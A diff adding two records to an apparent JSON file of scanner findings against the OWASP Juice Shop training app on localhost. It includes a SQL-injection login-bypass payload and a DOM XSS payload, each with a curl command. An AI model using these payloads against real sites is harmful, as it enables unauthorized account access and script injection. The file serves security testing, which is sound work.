@@ -208,5 +208,25 @@
     "curl_command": "curl -X GET 'http://localhost:4040?URL_FRAGMENT=#/search?q=<img src=x onerror=alert(1)>'",
     "response_details": "DOM Sink Triggered with message: 1",
     "timestamp": "2026-03-13T14:08:59.746678"
+  },
+  {
+    "id": 22,
+    "job_id": 8,
+    "vuln_id": 9,
+    "payload": "admin@juice-sh.op'--",
+    "screenshot_path": "fake_file_storage/img/job_8/finding_22/evidence_9dcf5b5fffdf404f9f11fd005f383ddd.png",
+    "curl_command": "curl -X POST 'http://localhost:4040/#/login' -d 'username=admin@juice-sh.op'--'",
+    "response_details": "Successfully bypassed authentication using payload: admin@juice-sh.op'--. This allows unauthorized access to user accounts.",
+    "timestamp": "2026-03-23T23:25:06.943378"
+  },
+  {
+    "id": 23,
+    "job_id": 8,
+    "vuln_id": 10,
+    "payload": "#/search?q=<img src=x onerror=alert(1)>",
+    "screenshot_path": "fake_file_storage/img/job_8/finding_23/evidence_b7d359229e974a25a59b85adf28a25db.png",
+    "curl_command": "curl -X GET 'http://localhost:4040?URL_FRAGMENT=#/search?q=<img src=x onerror=alert(1)>'",
+    "response_details": "DOM Sink Triggered with message: 1",
+    "timestamp": "2026-03-23T23:25:06.943378"
   }
 ]
